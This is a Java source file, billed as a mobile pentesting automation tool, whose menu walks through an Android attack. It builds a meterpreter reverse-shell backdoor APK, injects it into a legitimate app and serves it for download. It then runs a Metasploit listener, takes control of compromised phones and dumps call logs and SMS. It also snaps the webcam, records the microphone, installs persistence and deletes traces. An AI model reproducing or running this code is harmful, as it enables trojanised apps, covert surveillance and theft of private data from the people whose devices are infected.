// Mobile Penetration Testing Automation Script
// Author: Muhammad Sudais Usmani
// Description: This script automates various tasks related to mobile pentesting.

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Scanner;

public class MobilePentestAutomation {
    
    public static void runCommand(String command) {
        System.out.println("[+] Executing: " + command);
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"bash", "-c", command});
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            process.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    public static void checkADB() {
        runCommand("adb devices");
        runCommand("adb connect 192.168.170.101:5555");
    }

    public static void adbShellAccess() {
        runCommand("adb shell");
    }

    public static void generatePayload() {
        runCommand("msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.130.129 LPORT=443 -o backdoor.apk");
    }

    public static void injectPayload() {
        Scanner scanner = new Scanner(System.in);
        System.out.print("Enter path to original APK: ");
        String originalAPK = scanner.nextLine();
        String command = "msfvenom -x " + originalAPK + " -p android/meterpreter/reverse_tcp LHOST=192.168.130.129 LPORT=443 -o infected_app.apk";
        runCommand(command);
    }

    public static void startHTTPServer() {
        runCommand("python3 -m http.server 8080 &");
    }

    public static void startMSFListener() {
        runCommand("msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 192.168.130.129; set LPORT 443; exploit'");
    }

    public static void controlDevice() {
        runCommand("msfconsole -q -x 'sessions'");
        Scanner scanner = new Scanner(System.in);
        System.out.print("Enter session ID to interact with: ");
        String sessionID = scanner.nextLine();
        String command = "msfconsole -q -x 'sessions -i " + sessionID + "'";
        runCommand(command);
    }

    public static void extractData() {
        runCommand("msfconsole -q -x 'dump_calllog'");
        runCommand("msfconsole -q -x 'dump_sms'");
        runCommand("msfconsole -q -x 'webcam_snap'");
        runCommand("msfconsole -q -x 'record_mic 10'");
    }

    public static void maintainAccess() {
        runCommand("msfconsole -q -x 'run persistence -A'");
    }

    public static void clearTraces() {
        runCommand("adb shell rm /sdcard/backdoor.apk");
    }

    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        while (true) {
            System.out.println("\n[ Mobile Pentesting Automation ]");
            System.out.println("1) Check ADB Connection");
            System.out.println("2) Gain ADB Shell Access");
            System.out.println("3) Generate Malicious APK");
            System.out.println("4) Inject Payload into APK");
            System.out.println("5) Start HTTP Server for Deployment");
            System.out.println("6) Start Metasploit Listener");
            System.out.println("7) Control Compromised Device");
            System.out.println("8) Extract Data from Target");
            System.out.println("9) Maintain Access");
            System.out.println("10) Clear Traces");
            System.out.println("11) Exit");
            System.out.print("Choose an option: ");
            
            int choice = scanner.nextInt();
            scanner.nextLine(); // Consume newline
            
            switch (choice) {
                case 1:
                    checkADB();
                    break;
                case 2:
                    adbShellAccess();
                    break;
                case 3:
                    generatePayload();
                    break;
                case 4:
                    injectPayload();
                    break;
                case 5:
                    startHTTPServer();
                    break;
                case 6:
                    startMSFListener();
                    break;
                case 7:
                    controlDevice();
                    break;
                case 8:
                    extractData();
                    break;
                case 9:
                    maintainAccess();
                    break;
                case 10:
                    clearTraces();
                    break;
                case 11:
                    System.out.println("Exiting...");
                    scanner.close();
                    return;
                default:
                    System.out.println("Invalid option, please try again.");
            }
        }
    }
}
